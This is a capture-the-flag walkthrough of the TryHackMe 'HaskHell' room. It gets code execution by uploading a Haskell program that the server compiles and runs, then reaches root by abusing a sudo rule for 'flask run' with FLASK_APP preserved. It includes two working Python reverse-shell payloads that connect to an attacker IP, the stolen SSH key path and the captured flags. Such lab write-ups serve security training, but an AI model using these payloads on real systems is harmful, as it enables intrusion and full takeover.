# Tryhackme.com Room : HaskHell

`https://tryhackme.com/room/haskhell`

## Instance

```bash
export IP="10.10.243.31"
```

## Nmap

```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial Foothold

We have a website on port `5001` which is a "school" website for a class on haskell.

We find an "homework" at `:5001/homework1` 

```
Welcome to your first homework assignment! Your problems are as follows.

1) A function called "fib" that outputs the Fibonacci sequence. I will be checking for the first 100 numbers formatted as "1 1 3 ...".

2) A function called "range" that takes 2 numbers and returns a flat list containing all the integers in that range. Example: range 1 5 outputs [1,2,3,4,5]

3) A function called "grey" that takes a number as input and returns all of the codes for that n-bit number. Ex: grey 3 outputs ['000','001','011','010',110,111,101,100]. You can find more information about grey codes here: https://en.wikipedia.org/wiki/Gray_code"

All of your functions must have the types correctly declared. I'll give you number one for free, as an example: fib :: Int -> Int -> [Int]
```

The is a link pointing to `/upload` which is where we are supposed to submit the homework (haskell program) but it return a `404`.

Running `gobuster` we find that the actual submission page is on `/submit`



Once submitted, the haskell script is compiled on the server and runned. The output goes to `/uploads`.



We write this simple `fib` script :

```haskell
fib :: Int -> Int
fib 0 = 0
fib 1 = 1
fib n = fib (n - 1) + fib (n - 2)

main = do
    let result = fib 7
    print result
```

When we upload it, we get this output at `/uploads/fib.hs` :

```
[1 of 1] Compiling Main             ( /home/flask/uploads/fib.hs, /home/flask/uploads/fib.o )
Linking /home/flask/uploads/fib ...
13
```

Seems like the server running this is `flask` so it's in `python`



Looking at haskell doc, we find that we can execute shell cmd with `System.Process.readProcess`.

We write this little test program :

```haskell
import System.Process

main = do
    resp <- readProcess "ls" [] ""
    print resp
```

And we get

```
[1 of 1] Compiling Main             ( /home/flask/uploads/shell.hs, /home/flask/uploads/shell.o )
Linking /home/flask/uploads/shell ...
"app.py\napp.pyc\n__pycache__\nuploads\n"
```

Time to get a revshell.

We do it with

```haskell
import System.Process

main = do
    resp <- readProcess "sh" ["-c", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.6.32.20\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"] ""
    print resp
```

And we got a shell as the user `flask`



We have access to `/home/prof` so we can retrieve `/home/prof/user.txt` :

```
flag{academic_dishonesty}
```

We can also retrieve the ssh key in `/home/prof/.ssh` so we can use ssh to connect as `prof`

## Priv Esc

Now that we are `prof` we cam run `sudo -l` and we get :

```
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

We see that `FLASK_APP` env variable is kept so



We craft this small flask app (I guess we wouldn't really need to have a valid flask app)

```python
from flask import Flask
app = Flask(__name__)

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

@app.route('/')
def hello_world():
    return 'Hello, World!'
```



And we get a reverse shell as `root`



`/root/root.txt` :

```
flag{im_purely_functional}
```



## Wrap up

* This was a pretty easy challenge. The "difficult part" was figuring out the haskell syntax.
* Confirmed that we could get a reverse shell with a python script containing only our rev shell. No need to have a valid flask app